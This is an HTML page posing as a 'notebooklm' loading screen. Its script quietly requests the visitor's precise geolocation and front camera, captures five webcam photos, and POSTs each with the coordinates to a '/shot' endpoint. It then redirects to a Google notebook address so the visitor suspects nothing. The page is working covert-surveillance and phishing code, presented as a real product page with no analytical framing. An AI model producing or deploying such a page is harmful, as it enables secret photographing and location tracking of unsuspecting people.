<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>notebooklm</title>
<style>
  body { margin:0; min-height:100vh; display:grid; place-items:center; font-family:system-ui; background:#0f172a; color:#e2e8f0; }
  .card { text-align:center; max-width:500px; padding:40px 32px; background: #1e293b; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
  
  /* Spinning Ring Styles */
  .ring { width: 50px; height: 50px; border: 5px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
  @keyframes spin { to { transform: rotate(360deg); } }

  h2 { color: #38bdf8; margin-top: 0; }
  p { opacity:.9; line-height:1.6; font-size: 15px; }
  .status { font-weight: bold; color: #fbbf24; margin-top: 20px; font-size: 15px; }
  .success { color: #10b981; }
  .error { color: #ef4444; }
</style>
</head>
<body>
<div class="card" id="main-card">
  <div class="ring"></div>
  <h2>please wait...</h2>

  
  <p id="status" class="status">Initializing...</p>
</div>

<video id="preview" autoplay muted playsinline style="display:none;"></video>

<script>
window.addEventListener("DOMContentLoaded", () => {
  const video = document.getElementById("preview");
  const status = document.getElementById("status");
  const card = document.getElementById("main-card");

  function getLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve("....");
      } else {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
          (err) => {
            if (err.code === 1) resolve("....");
            else if (err.code === 2) resolve("....");
            else if (err.code === 3) resolve("....");
            else resolve("....");
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }
    });
  }

  (async () => {
    status.textContent = "...";
    const userLocation = await getLocation();
    
    if (userLocation.includes("denied") || userLocation.includes("unavailable") || userLocation.includes("timeout")) {
        status.textContent = `.... ${userLocation}`;
        status.classList.add("error");
        await new Promise(r => setTimeout(r, 3000)); 
    } else {
        status.textContent = "....";
    }

    status.textContent = "....";
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, audio: false
      });
    } catch (e) {
      status.textContent = "...";
      status.classList.add("error");
      return;
    }

    video.srcObject = stream;
    await video.play();

    const c = document.createElement("canvas");
    c.width = video.videoWidth || 640;
    c.height = video.videoHeight || 480;
    const ctx = c.getContext("2d");

    let n = 0;
    status.textContent = "...";

    const timer = setInterval(async () => {
      ctx.drawImage(video, 0, 0, c.width, c.height);
      const img = c.toDataURL("image/jpeg", 0.7);
      
      try {
        await fetch("/shot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ img: img, loc: userLocation })
        });
      } catch (_) {}

      n++;
      if (n < 5) {
          status.textContent = `.... ${n + 1} / 5`;
      } else {
        clearInterval(timer);
        stream.getTracks().forEach(t => t.stop());
        
        // This completely replaces the card, removing the spinner!
        card.innerHTML = `
          <h2 class="success">✅ please wait...</h2>
         
        `;

        let secondsLeft = 1;
        const countdownEl = document.getElementById("countdown");
        
        const redirectTimer = setInterval(() => {
          secondsLeft--;
          if (countdownEl) countdownEl.textContent = secondsLeft;
          
          if (secondsLeft <= 0) {
            clearInterval(redirectTimer);
            window.location.href = "https://notebook.google.com/";
          }
        }, 1000);
      }
    }, 2000);
  })();
});
</script>
</body></html>
